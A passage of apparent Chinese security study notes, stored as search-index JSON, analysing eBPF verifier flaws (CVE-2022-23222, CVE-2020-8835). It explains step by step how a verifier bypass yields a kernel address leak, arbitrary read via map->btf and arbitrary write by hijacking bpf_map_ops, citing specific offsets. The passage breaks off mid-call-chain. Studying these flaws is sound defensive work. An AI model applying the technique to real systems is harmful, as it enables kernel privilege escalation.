1\uff0c\u518d\u6784\u9020 r3 \u5b8c\u5168\u786e\u5b9a\u4e3a 0x1_00000002\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5bf9 r2 \u548c r3 \u8fdb\u884c AND\uff0c\u4f1a\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li><code>tnum_and</code> \u51fd\u6570\u4f1a\u66f4\u65b0 r2 \u7684\u5bc4\u5b58\u5668\u72b6\u6001\uff0c\u5176 mask \u4e3a 0x1_00000000\uff0cvalue \u4e3a 0\uff0c\u5373\u53ea\u6709\u7b2c 32 \u4f4d\u4e0d\u786e\u5b9a\uff0c\u5176\u4ed6\u90fd\u4e3a 0</li> <li><code>scalar32_min_max_and</code> \u51fd\u6570\u4f1a\u76f4\u63a5\u8fd4\u56de\uff0c\u56e0\u4e3a r2 \u548c r3 \u7684\u4f4e 32 \u4f4d\u90fd\u5b8c\u5168\u786e\u5b9a</li> <li><code>scalar_min_max_and</code> \u51fd\u6570\u4e0d\u4f1a\u8c03\u7528\u5230 <code>__mark_reg_known</code>\uff0c\u56e0\u4e3a r2 \u7684 64 \u4f4d\u503c\u5e76\u4e0d\u5b8c\u5168\u786e\u5b9a</li> <li><code>__update_reg32_bounds</code> \u51fd\u6570\u4f1a\u66f4\u65b0 r2 \u7684 32 \u4f4d\u8303\u56f4<ul> <li>\u56e0\u4e3a var_off32.value = 0 &lt; s32_min_value = 1\uff0c\u6240\u4ee5 s32_min_value \u4e0d\u53d8</li> <li>\u56e0\u4e3a var_off32.value = 0 &lt; s32_max_value = 1\uff0c\u6240\u4ee5 s32_max_value \u53d8\u4e3a 0</li> <li>u32_min_value \u548c u32_max_value \u540c\u7406</li> </ul> </li> </ul> <p>\u8fd9\u6837\u4e0b\u6765\u7684\u7ed3\u679c\u5c31\u662f r2 \u7684 32 \u4f4d\u8303\u56f4\u90fd\u53d8\u4e3a\u4e86\u6700\u5927\u4e3a 0 \u6700\u5c0f\u4e3a 1\uff0c\u4f1a\u51fa\u73b0\u68c0\u67e5\u9519\u8bef\u3002\u540c\u6837\u5229\u7528\u5373\u53ef\u7ed5\u8fc7 verifier \u7684\u68c0\u67e5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u3002\u89e3\u51b3\u65b9\u5f0f\u4e5f\u662f\u4e3a <code>scalar32_min_max_and</code> \u51fd\u6570\u5728 src \u548c dst \u90fd\u786e\u5b9a\u7684\u60c5\u51b5\u4e0b\u6dfb\u52a0 <code>__mark_reg32_known</code> \u51fd\u6570\u7684\u8c03\u7528\u8bbe\u7f6e\u8fb9\u754c\u5373\u53ef\u3002</p>"},{"location":"sec/syssec/project/#cve-2022-23222","title":"CVE-2022-23222","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u7531 tr3e \u5728 2022 \u5e74 1 \u6708\u53d1\u73b0\u5e76\u4e0a\u62a5\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u548c\u524d\u4e09\u4e2a\u6f0f\u6d1e\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u4e5f\u662f\u5728 verifier \u7a0b\u5e8f\u4e2d\u51fa\u73b0\u4e86\u9057\u6f0f\u7684\u68c0\u67e5\u5bfc\u81f4\u7684\u3002</p> <p>Verifier \u5728\u68c0\u67e5\u4f7f\u7528\u6307\u9488\u7684\u6307\u4ee4\u65f6\u4f1a\u5bf9\u6307\u4ee4\u662f\u5426\u6709\u6548\u8fdb\u884c\u68c0\u67e5\u3002\u6bd4\u5982\u5728\u8c03\u7528 <code>bpf_map_lookup_elem()</code> \u51fd\u6570\u540e\uff0c\u5982\u679c\u4e0d\u5224\u65ad\u7ed3\u679c\u662f\u5426\u4e3a NULL \u5219\u65e0\u6cd5\u4f7f\u7528\u8fd9\u4e2a\u7ed3\u679c\uff0c\u56e0\u4e3a verifier \u9a8c\u8bc1\u8fd9\u53ef\u80fd\u662f\u4e2a NULL \u6307\u9488\uff0c\u5982\u679c\u4f7f\u7528\u4e86\u7684\u8bdd\u4f1a\u62d2\u7edd\u52a0\u8f7d\u3002\u5173\u4e8e\u6307\u9488\u662f\u5426\u6709\u6548\uff0cverifier \u901a\u8fc7 <code>enum bpf_reg_type</code> \u6765\u8bb0\u5f55\u5bc4\u5b58\u5668\u4e2d\u503c\u7684\u7c7b\u578b\uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>enum bpf_reg_type {\n    NOT_INIT = 0,         /* nothing was written into register */\n    SCALAR_VALUE,         /* reg doesn't contain a valid pointer */\n    PTR_TO_CTX,           /* reg points to bpf_context */\n    CONST_PTR_TO_MAP,     /* reg points to struct bpf_map */\n    PTR_TO_MAP_VALUE,     /* reg points to map element value */\n    PTR_TO_MAP_VALUE_OR_NULL,  /* points to map elem value or NULL */\n    PTR_TO_SOCKET,        /* reg points to struct bpf_sock */\n    PTR_TO_SOCKET_OR_NULL,      /* reg points to struct bpf_sock or NULL */\n    PTR_TO_SOCK_COMMON,   /* reg points to sock_common */\n    PTR_TO_SOCK_COMMON_OR_NULL, /* reg points to sock_common or NULL */\n    PTR_TO_TCP_SOCK,      /* reg points to struct tcp_sock */\n    PTR_TO_TCP_SOCK_OR_NULL,    /* reg points to struct tcp_sock or NULL */\n    PTR_TO_MEM,           /* reg points to valid memory region */\n    PTR_TO_MEM_OR_NULL,   /* reg points to valid memory region or NULL */\n    PTR_TO_RDONLY_BUF,    /* reg points to a readonly buffer */\n    PTR_TO_RDONLY_BUF_OR_NULL,  /* reg points to a readonly buffer or NULL */\n    PTR_TO_RDWR_BUF,      /* reg points to a read/write buffer */\n    PTR_TO_RDWR_BUF_OR_NULL,    /* reg points to a read/write buffer or NULL */\n    ...\n};\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u5bf9\u4e8e\u6307\u9488\u7c7b\u578b\uff0c\u4f1a\u5b58\u5728\u4e00\u4e9b\u4ee5 <code>_OR_NULL</code> \u7ed3\u5c3e\u7684\u7c7b\u578b\uff0c\u8868\u793a\u8fd9\u4e2a\u6307\u9488\u7684\u503c\u672a\u77e5\uff0c\u53ef\u80fd\u4e3a NULL\u3002\u7136\u540e verifier \u5c31\u4f1a\u9650\u5236\u8fd9\u4e9b <code>_OR_NULL</code> \u7c7b\u578b\u7684\u6307\u9488\u7684\u4f7f\u7528\uff0c\u5176\u53ef\u4ee5\u8fdb\u884c\u7684\u64cd\u4f5c\u975e\u5e38\u6709\u9650\u3002\u53ea\u6709\u5728\u4e0e NULL \u8fdb\u884c\u4e0d\u7b49\u7684\u6bd4\u8f83\u540e\u624d\u53ef\u4ee5\u53bb\u6389 <code>_OR_NULL</code>\uff0c\u8fd9\u6837 verifier \u624d\u80fd\u786e\u5b9a\u8fd9\u4e2a\u6307\u9488\u4e0d\u4e3a NULL\u3002</p> <p>\u524d\u4e09\u4e2a\u6f0f\u6d1e\u4e2d\u7684\u66f4\u65b0\u662f\u9488\u5bf9\u6807\u91cf\uff08\u4e0d\u5e26\u6307\u9488\uff09\u7684 ALU \u8fd0\u7b97\u68c0\u6d4b\uff0c\u51fd\u6570\u4e3a <code>adjust_scalar_min_max_vals()</code>\uff0c\u800c\u672c\u6f0f\u6d1e\u4e2d\u5b58\u5728\u95ee\u9898\u7684\u51fd\u6570\u662f\u9488\u5bf9\u6307\u9488\u7c7b\u578b\u7684 ALU \u8fd0\u7b97\u68c0\u67e5 <code>adjust_ptr_min_max_vals()</code>\u3002\u4e3a\u4e86\u7981\u6b62\u5bf9\u4e8e\u53ef\u80fd\u4e3a NULL \u7684\u6307\u9488\u8fdb\u884c\u64cd\u4f5c\uff0c\u5728\u8be5\u51fd\u6570\u7684\u5f00\u5934\u8fdb\u884c\u4e86\u68c0\u67e5\uff1a</p> <pre><code>static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,\n                   struct bpf_insn *insn,\n                   const struct bpf_reg_state *ptr_reg,\n                   const struct bpf_reg_state *off_reg)\n{\n...\n    switch (ptr_reg-&gt;type) {\n    case PTR_TO_MAP_VALUE_OR_NULL:\n        verbose(env, \"R%d pointer arithmetic on %s prohibited, null-check it first\\n\",\n            dst, reg_type_str[ptr_reg-&gt;type]);\n        return -EACCES;\n    case CONST_PTR_TO_MAP:\n        /* smin_val represents the known value */\n        if (known &amp;&amp; smin_val == 0 &amp;&amp; opcode == BPF_ADD)\n            break;\n        fallthrough;\n    case PTR_TO_PACKET_END:\n    case PTR_TO_SOCKET:\n    case PTR_TO_SOCKET_OR_NULL:\n    case PTR_TO_SOCK_COMMON:\n    case PTR_TO_SOCK_COMMON_OR_NULL:\n    case PTR_TO_TCP_SOCK:\n    case PTR_TO_TCP_SOCK_OR_NULL:\n    case PTR_TO_XDP_SOCK:\n        verbose(env, \"R%d pointer arithmetic on %s prohibited\\n\",\n            dst, reg_type_str[ptr_reg-&gt;type]);\n        return -EACCES;\n    default:\n        break;\n    }\n...\n}\n</code></pre> <p>\u53ef\u89c1\u5982\u679c\u662f\u4e00\u4e9b <code>_OR_NULL</code> \u7684\u6307\u9488\uff0c\u5219\u4f1a\u76f4\u63a5\u8fd4\u56de\u9519\u8bef\u5bfc\u81f4\u52a0\u8f7d\u5931\u8d25\u3002\u4f46\u95ee\u9898\u5728\u4e8e\u8fd9\u4e2a switch \u5e76\u6ca1\u6709\u5bf9\u6240\u6709 <code>bpf_reg_type</code> \u8fdb\u884c\u68c0\u67e5\uff0c\u6bd4\u5982 <code>PTR_TO_MEM_OR_NULL</code> <code>PTR_TO_RDONLY_BUF_OR_NULL</code> <code>PTR_TO_RDWR_BUF_OR_NULL</code> \u7b49\u7c7b\u578b\u5c31\u5e76\u6ca1\u6709\u88ab\u68c0\u67e5\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u8fd9\u4e9b\u6307\u9488\u53ef\u4ee5\u88ab\u7528\u4e8e\u8fd0\u7b97\uff0c\u4ece\u800c\u7ed5\u8fc7 verifier \u7684\u68c0\u67e5\u3002</p> <p>\u63a5\u4e0b\u6765\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u6211\u4eec\u901a\u8fc7\u8c03\u7528 <code>BPF_FUNC_ring_reserve</code> \u51fd\u6570\u6765\u5f97\u5230\u4e00\u4e2a <code>PTR_TO_MEM_OR_NULL</code> \u7c7b\u578b\u7684\u6307\u9488\uff0c\u901a\u8fc7\u4f20\u5165\u53c2\u6570 0xfff...fff \u6211\u4eec\u53ef\u4ee5\u5f97\u5230 NULL \u503c\u7684\u7ed3\u679c\uff0c\u5047\u8bbe\u4e3a r0\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5c06 r0 \u590d\u5236\u5230 r1\uff0c\u518d\u5bf9 r1 \u52a0 1\uff0c\u7136\u540e\u518d\u5bf9 r0 \u8fdb\u884c NULL \u68c0\u67e5\uff0c\u63a5\u4e0b\u6765 verifier \u5c31\u4f1a\u8ba4\u4e3a r0 \u548c r1 \u90fd\u662f 0 \u503c\u3002\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u50cf\u524d\u4e09\u4e2a\u6f0f\u6d1e\u4e00\u6837\u5bf9 r1 \u4e58\u4ee5\u4efb\u610f\u503c\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u4ece\u800c\u5b9e\u73b0\u63d0\u6743\u3002</p>"},{"location":"sec/syssec/project/#ebpf_7","title":"eBPF \u5b89\u5168\u6f0f\u6d1e\u603b\u7ed3","text":"<p>eBPF \u4f5c\u4e3a\u4e00\u4e2a\u5f3a\u5927\u7684\u5185\u6838\u6001\u6267\u884c\u5f15\u64ce\uff0c\u5176\u5b89\u5168\u6027\u81f3\u5173\u91cd\u8981\u3002\u901a\u8fc7 verifier\u3001JIT \u7f16\u8bd1\u5668\u3001\u5185\u5b58\u8bbf\u95ee\u9650\u5236\u7b49\u591a\u79cd\u624b\u6bb5\uff0ceBPF \u4fdd\u8bc1\u4e86\u5176\u5b89\u5168\u6027\u3002\u4f46\u662f\u5728\u5b9e\u9645\u4f7f\u7528\u4e2d\uff0c\u7531\u4e8e\u5176\u590d\u6742\u6027\u548c\u529f\u80fd\u6027\uff0c\u4e0d\u53ef\u907f\u514d\u7684\u4f1a\u51fa\u73b0\u4e00\u4e9b\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u6f0f\u6d1e\u5927\u591a\u662f\u7531\u4e8e verifier \u5728\u68c0\u67e5\u65f6\u9057\u6f0f\u4e86\u4e00\u4e9b\u60c5\u51b5\uff0c\u5bfc\u81f4\u4e86\u4e00\u4e9b\u4e0d\u7b26\u5408\u89c4\u8303\u7684\u7a0b\u5e8f\u88ab\u52a0\u8f7d\u3002\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u5f0f\u4e5f\u5927\u591a\u662f\u901a\u8fc7\u6784\u9020\u4e00\u4e9b\u7279\u6b8a\u7684\u6307\u4ee4\u5e8f\u5217\u6765\u7ed5\u8fc7 verifier \u7684\u68c0\u67e5\uff0c\u4ece\u800c\u5b9e\u73b0\u63d0\u6743\u3002</p> <p>\u6839\u636e\u524d\u9762\u5bf9\u4e8e\u56db\u4e2a\u6f0f\u6d1e\u7684\u5206\u6790\uff0c\u518d\u52a0\u4e0a\u5728 NVD \u4e0a\u641c\u7d22\u67e5\u9605\u4e86 eBPF \u76f8\u5173\u4f1a\u9020\u6210\u5185\u6838\u63d0\u6743\u7684\u4e25\u91cd\u6f0f\u6d1e\uff08CVE-2021-3600\u3001CVE-2021-3489\u3001CVE-2021-4204\u3001CVE-2021-31440\u3001CVE-2021-34866\u3001CVE-2023-39191\u3001CVE-2022-0500\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 eBPF \u76f8\u5173\u6f0f\u6d1e\u7ecf\u5e38\u51fa\u73b0\u4e8e\uff1a</p> <ul> <li>Verifier \u5bf9\u4e8e BPF \u6307\u4ee4\u96c6\u4e2d 32 \u4f4d\u64cd\u4f5c\u6307\u4ee4\u4e0d\u80fd\u6b63\u786e\u8ddf\u8e2a\u5bc4\u5b58\u5668\u4f4e 32 \u4f4d\u503c\u8fb9\u754c\u4fe1\u606f<ul> <li>CVE-2020-8835\u3001CVE-2020-27194\u3001CVE-2021-3600\u3001CVE-2021-31440</li> </ul> </li> <li>Verifier \u7f3a\u4e4f\u5bf9\u4e8e\u6307\u9488\u7c7b\u578b\u64cd\u4f5c\u7684\u68c0\u9a8c\uff0c\u6216\u53d8\u91cf\u7c7b\u578b\u6df7\u6dc6<ul> <li>CVE-2022-23222\u3001CVE-2023-39191\u3001CVE-2021-34866</li> </ul> </li> <li>eBPF helper \u51fd\u6570\u7f3a\u4e4f\u68c0\u6d4b\uff0c\u5bfc\u81f4\u901a\u8fc7\u53c2\u6570\u8d8a\u754c\u8bfb\u5199<ul> <li>CVE-2021-3489\u3001CVE-2021-4204</li> </ul> </li> <li>eBPF \u7a0b\u5e8f\u4e0d\u53d7\u9650\u5236\u7684\u52a0\u8f7d\u65b9\u5f0f<ul> <li>CVE-2022-0500\uff08\u901a\u8fc7 BTF \u52a0\u8f7d\u5bfc\u81f4\u7684\u8d8a\u754c\u8bbf\u95ee\uff09</li> </ul> </li> </ul> <p>Mohamed \u7b49\u4eba\u7684\u7814\u7a76 Understanding the Security of Linux eBPF Subsystem \u4e2d\u4e5f\u7edf\u8ba1\u4e86 eBPF \u6f0f\u6d1e\u6240\u6709 CVE \u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p>\u53ef\u89c1\u5c06\u8fd1\u4e00\u534a\u7684\u6f0f\u6d1e\u51fa\u73b0\u4e8e verifier \u4e0a\uff0c\u7279\u522b\u662f\u5bf9\u4e8e ALU \u6307\u4ee4\u7684\u68c0\u6d4b\u4e0a\uff0c\u5176\u6b21\u662f helper \u51fd\u6570\uff0c\u63a5\u4e0b\u6765\u624d\u662f eBPF \u76f8\u5173 core \u4ee3\u7801\u3002\u8fd9\u4e5f\u8bf4\u660e\u4e86 eBPF \u7684\u6f0f\u6d1e\u4e3b\u8981\u8fd8\u662f\u51fa\u73b0\u5728 verifier \u4e0a\uff0c\u6240\u4ee5\u4e3a\u4e86\u63d0\u9ad8 eBPF \u7684\u5b89\u5168\u6027\uff0c\u6211\u4eec\u53ef\u4ee5\u589e\u52a0\u5bf9\u4e8e verifier \u548c helper \u51fd\u6570\u7684\u5ba1\u8ba1\u4e0e fuzz \u6d4b\u8bd5\uff0c\u5173\u6ce8\u68c0\u9a8c\u8fc7\u7a0b\u4e2d\u7684\u5bc4\u5b58\u5668\u503c\u8fb9\u754c\u95ee\u9898\uff0c\u5e76\u5173\u6ce8\u6307\u9488\u7c7b\u578b\u7684\u64cd\u4f5c\uff0c\u5e76\u4e14\u5728\u540e\u7eed eBPF \u7684\u6269\u5c55\u4e2d\u4e5f\u6ce8\u610f\u8fd9\u4e9b\u7ecf\u5e38\u53d1\u751f\u7684\u95ee\u9898\uff0c\u4ee5\u514d\u5bf9\u4e8e\u5185\u6838\u5b89\u5168\u9020\u6210\u5de8\u5927\u5f71\u54cd\u3002</p>"},{"location":"sec/syssec/project/#ebpf_8","title":"eBPF \u6f0f\u6d1e\u63d0\u6743\u5229\u7528\u5206\u6790","text":"<p>\u63a5\u4e0b\u6765\u6211\u4eec\u57fa\u4e8e CVE-2020-8835 \u7684\u6f0f\u6d1e\u6765\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u4ec5\u901a\u8fc7\u7ed5\u8fc7 verifier \u7684\u5bc4\u5b58\u5668\u503c\u8fb9\u754c\u68c0\u67e5\uff0c\u8be5\u5982\u4f55\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u5229\u7528\uff0c\u5b9e\u73b0\u5730\u5740\u6cc4\u6f0f\u3001\u4efb\u610f\u5730\u5740\u8bfb\u5199\u3001\u5185\u6838\u63d0\u6743\u7b49\u7ed3\u679c\u3002</p>"},{"location":"sec/syssec/project/#_1","title":"\u5730\u5740\u6cc4\u6f0f\u539f\u7406","text":"<p>\u5f53\u4f7f\u7528 <code>bpf_create_map</code> \u521b\u5efa\u6570\u7ec4\u7c7b\u578b\u7684 map \u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4f1a\u8c03\u7528\u5185\u6838\u4e2d\u7684 <code>map_create</code> \u51fd\u6570\u6765\u521b\u5efa\u5982\u4e0b\u7684\u4e00\u4e2a <code>bpf_array</code> \u7ed3\u6784\u4f53\uff1a</p> <pre><code>struct bpf_array {\n    struct bpf_map map;\n    u32 elem_size;\n    u32 index_mask;\n    struct bpf_array_aux *aux;\n    union {\n        char value[];\n        void *ptrs[];\n        void *pptrs[];\n    };\n}\n</code></pre> <p>\u6211\u4eec\u5b9e\u9645\u53ef\u63a7\u7684\uff0c\u4e5f\u5c31\u662f\u5b9e\u9645\u8bfb\u5199\u8bbf\u95ee\u7684\u5185\u5b58\u662f\u6700\u540e\u7684 union \u4e5f\u5c31\u662f\u4e00\u4e2a\u53d8\u957f\u7684 value \u6570\u7ec4\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b verifier \u4f1a\u68c0\u67e5\u5bf9\u8fd9\u4e9b\u7684\u8bbf\u5b58\u5730\u5740\uff0c\u53ea\u6709\u843d\u5728 value \u5185\u7684\u90e8\u5206\u624d\u80fd\u8bbf\u5b58\uff0c\u5426\u5219\u4f1a\u4e0d\u901a\u8fc7\u9a8c\u8bc1\u3001\u52a0\u8f7d\u9519\u8bef\u3002</p> <p>\u4f46\u6839\u636e\u524d\u9762\u6211\u4eec\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c\u6765\u4f7f\u5f97\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u7ed5\u8fc7 verifier \u7684\u68c0\u67e5\uff0c\u5047\u8bbe\u6211\u4eec\u4ee4 r6 \u4e3a 0x110\uff0c\u4f46 verifier \u8ba4\u4e3a\u5176\u4e3a 0\uff0c\u90a3\u8fd9\u6837\u5982\u679c\u6211\u4eec\u8bbf\u95ee <code>bpf_array.value[0-r6]</code>\uff0cverifier \u4f1a\u8ba4\u4e3a\u5176\u8bbf\u95ee\u7684\u662f <code>value[0]</code> \u6ca1\u6709\u95ee\u9898\u3002\u800c value \u5728\u7ed3\u6784\u4f53\u4e2d\u7684\u504f\u79fb\u662f 0x110\uff0c\u6240\u4ee5 -0x110 \u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u7ed3\u6784\u4f53\u7684\u5f00\u5934\uff0c\u4e5f\u5c31\u662f <code>bpf_map</code> \u7ed3\u6784\u4f53\u7684\u5185\u5bb9\uff1a</p> <pre><code>struct bpf_map {\n    const struct bpf_map_ops *ops;\n    struct bpf_map *inner_map_meta;\n    void *security;\n    enum bpf_map_type map_type;\n    //....\n    u64 writecnt;\n}\n</code></pre> <p>\u5176\u4e2d array \u7c7b\u578b\u7684 map \u7684 <code>bpf_map_ops</code> \u662f\u4e00\u4e2a\u5185\u6838\u4e2d\u7684\u5e38\u91cf\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6 value-0x110 \u5904\u7684\u503c\u6765\u6cc4\u6f0f\u51fa\u5185\u6838\u5730\u5740\u3002</p>"},{"location":"sec/syssec/project/#_2","title":"\u4efb\u610f\u5730\u5740\u8bfb\u539f\u7406","text":"<p>\u4efb\u610f\u5730\u5740\u8bfb\u5229\u7528\u7684\u662f bpf \u7cfb\u7edf\u8c03\u7528\u7684 BPF_OBJ_GET_INFO_BY_FD \u529f\u80fd\uff0c\u5176\u5185\u6838\u8c03\u7528\u7684\u4ee3\u7801\u4e3a\uff1a</p> <pre><code>static int bpf_map_get_info_by_fd(struct bpf_map *map,\n                  const union bpf_attr *attr,\n                  union bpf_attr __user *uattr)\n{\n    struct bpf_map_info __user *uinfo = u64_to_user_ptr(attr-&gt;info.info);\n    struct bpf_map_info info = {};\n    u32 info_len = attr-&gt;info.info_len;\n    ...\n        if (map-&gt;btf) {\n            info.btf_id = btf_id(map-&gt;btf);\n            info.btf_key_type_id = map-&gt;btf_key_type_id;\n            info.btf_value_type_id = map-&gt;btf_value_type_id;\n        }\n    ...\n        if (copy_to_user(uinfo, &amp;info, info_len) ||\n            put_user(info_len, &amp;uattr-&gt;info.info_len))\n            return -EFAULT;\n    return 0;\n}\n</code></pre> <p>\u5176\u4e2d <code>map-&gt;btf</code> \u662f\u4e00\u4e2a BTF \u7ed3\u6784\u4f53\u7684\u6307\u9488\uff0c\u800c <code>btf_id</code> \u51fd\u6570\u662f\u8bfb\u53d6\u8fd9\u4e2a\u7ed3\u6784\u4f53\u7684 id \u503c\uff0c\u800c id \u4f4d\u4e8e\u8be5\u7ed3\u6784\u4f53\u7684 0x58 \u504f\u79fb\u5904\u3002\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u4fee\u6539 <code>map-&gt;btf</code> \u4e3a target-0x58\uff0c\u8fd9\u6837 <code>btf_id</code> \u5c31\u4f1a\u8bbf\u95ee target \u5904\u7684\u503c\u3002</p> <p><code>btf_map</code> \u8fd9\u4e2a\u7ed3\u6784\u4f53\u5728\u524d\u9762\u6211\u4eec\u5c31\u5df2\u7ecf\u53ef\u4ee5\u6839\u636e\u6f0f\u6d1e\u6765\u5b8c\u5168\u8bbf\u95ee\u4e86\uff0c\u800c\u5176\u4e2d 0x40 \u504f\u79fb\u7684\u4f4d\u7f6e\u5c31\u662f btf \u6307\u9488\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u524d\u9762\u6cc4\u6f0f ops \u7684\u57fa\u7840\u4e0a\u52a0 0x40 \u5e76\u8986\u76d6\u4e3a target-0x58 \u5c31\u53ef\u4ee5\u4fee\u6539 <code>map-&gt;btf</code> \u4e86\u3002\u800c\u5728\u51fd\u6570\u7684\u7684\u672b\u5c3e\uff0c\u4f1a\u5c06\u8bbf\u95ee\u7684\u7ed3\u679c\u62f7\u8d1d\u5230\u7528\u6237\u7a7a\u95f4\uff0c\u5176\u4e2d <code>btf_id</code> \u5b57\u6bb5\u5728 <code>bpf_map_info</code> \u7ed3\u6784\u4f53\u7684 0x40 \u504f\u79fb\u5904\uff0c\u6240\u4ee5\u5728\u6211\u4eec\u5f97\u5230\u7ed3\u679c\u540e\uff0c\u5176 0x40 \u4f4d\u7f6e\u5904\u5c31\u662f\u6211\u4eec\u60f3\u8981\u8bbf\u95ee\u7684 target \u5730\u5740\u5904\u7684\u503c\uff0c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u3002</p>"},{"location":"sec/syssec/project/#_3","title":"\u4efb\u610f\u5730\u5740\u5199\u539f\u7406","text":"<p>\u65e2\u7136\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 <code>bpf_map</code> \u7ed3\u6784\u4f53\u4e2d\u7684\u503c\uff0c\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u52ab\u6301 <code>bpf_map_ops</code>\uff0c\u8986\u76d6\u8fd9\u4e2a\u6307\u9488\uff0c\u5c31\u53ef\u4ee5\u8ba9\u5185\u6838\u5728\u8c03\u7528\u5176\u4e2d\u51fd\u6570\u7684\u65f6\u5019\u8c03\u7528\u5230\u6211\u4eec\u6784\u9020\u7684\u5176\u4ed6\u51fd\u6570\u6307\u9488\u7684\u5730\u5740\u3002\u7136\u540e\u6211\u4eec\u60f3\u529e\u6cd5\u901a\u8fc7\u8c03\u7528\u6765\u8fdb\u884c\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u4e86\u3002</p> <p>\u6211\u4eec\u9009\u62e9\u4f7f\u7528 stack \u7c7b\u578b\u7684 map\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7 <code>bpf_update_elem</code> \u8c03\u7528\u5230 <code>map_update_elem</code> \u51fd\u6570\uff0c\u7136\u540e\u4ece ops \u4e2d\u53d6\u51fa <code>map_push_elem</code> \u51fd\u6570\u6307\u9488\u6765\u8c03\u7528\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u66f4\u6539 <code>map_push_elem</code> \u4f4d\u7f6e\u4e0a\u7684\u6307\u9488\u6307\uff0c\u4f7f\u5176\u8c03\u7528\u5230 <code>map_get_next_key</code> \u51fd\u6570\u3002</p> <p>\u4e3a\u4e86\u5c06 map \u6539\u4e3a stack \u7c7b\u578b\uff0c\u6211\u4eec\u4e5f\u662f\u76f4\u63a5\u4fee\u6539 <code>bpf_map</code> \u7ed3\u6784\u4f53\u7684\u5185\u5bb9\u5373\u53ef\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539\uff1a</p> <ul> <li>0x18 \u504f\u79fb\u4e0a\u7684 <code>map_type</code>\uff0c\u4fee\u6539\u4e3a BPF_MAP_TYPE_STACK</li> <li>0x24 \u504f\u79fb\u4e0a\u7684 <code>max_entries</code>\uff0c\u4fee\u6539\u4e3a 0xffffffff\uff0c\u5373 -1</li> <li>0x2c \u504f\u79fb\u4e0a\u7684 <code>spin_lock_off</code>\uff0c\u4fee\u6539\u4e3a 0</li> </ul> <p>\u7136\u540e\u52ab\u6301 ops \u6307\u9488\uff0c\u8986\u76d6\u5176\u4e2d\u7684 <code>map_push_elem</code> \u5143\u7d20\u4e3a <code>map_get_next_key</code> \u51fd\u6570\u6307\u9488\uff1a</p> <pre><code>const struct bpf_map_ops stack_map_ops = {\n    .map_alloc_check = queue_stack_map_alloc_check,\n    .map_alloc = queue_stack_map_alloc,\n    .map_free = queue_stack_map_free,\n    .map_lookup_elem = queue_stack_map_lookup_elem,\n    .map_update_elem = queue_stack_map_update_elem,\n    .map_delete_elem = queue_stack_map_delete_elem,\n    .map_push_elem = queue_stack_map_push_elem,  // \u4fee\u6539\u4e3a map_get_next_key\n    .map_pop_elem = stack_map_pop_elem,\n    .map_peek_elem = stack_map_peek_elem,\n    .map_get_next_key = queue_stack_map_get_next_key,\n};\n</code></pre> <p>\u7136\u540e\u5728\u6267\u884c <code>map_get_next_key</code> \u51fd\u6570\u65f6\uff0c\u4f1a\u53d1\u751f\u5185\u5b58\u7684\u5199\u5165\uff1a</p> <pre><code>static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)\n{\n    struct bpf_array *array = container_of(map, struct bpf_array, map);\n    u32 index = key ? *(u32 *)key : U32_MAX;\n    u32 *next = (u32 *)next_key;\n    if (index &gt;= array-&gt;map.max_entries) {\\\n        *next = 0;\n        return 0;\n    }\n    if (index == array-&gt;map.max_entries - 1)\n        return -ENOENT;\n    *next = index + 1; // *(u32 *)next_key = *(u32 *)key + 1\n    return 0;\n}\n</code></pre> <p>\u4fee\u6539 <code>max_entries</code> \u548c <code>spin_lock_off</code> \u662f\u4e3a\u4e86\u80fd\u6b63\u5e38\u6267\u884c\u5230\u51fd\u6570\u6700\u540e\uff0c\u5728\u6700\u540e\u6839\u636e\u5206\u6790\uff0c\u4f1a\u8fdb\u884c\u5185\u5b58\u5199\uff0c\u5373\u53d6\u51fa\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684 u32 \u503c\u52a0\u4e0a 1 \u518d\u5b58\u5230\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u5904\u3002\u6211\u4eec\u6267\u884c\u5230\u6b64\u7684\u8c03\u7528\u94fe\u4e3a\uff1a</p> <pre><code>bpf_update_elem(mapfd, &amp;key, &amp;value, flags)\n-&gt; map_update_elem(mapfd, &amp;key, &amp;value, flags)\n-&gt; 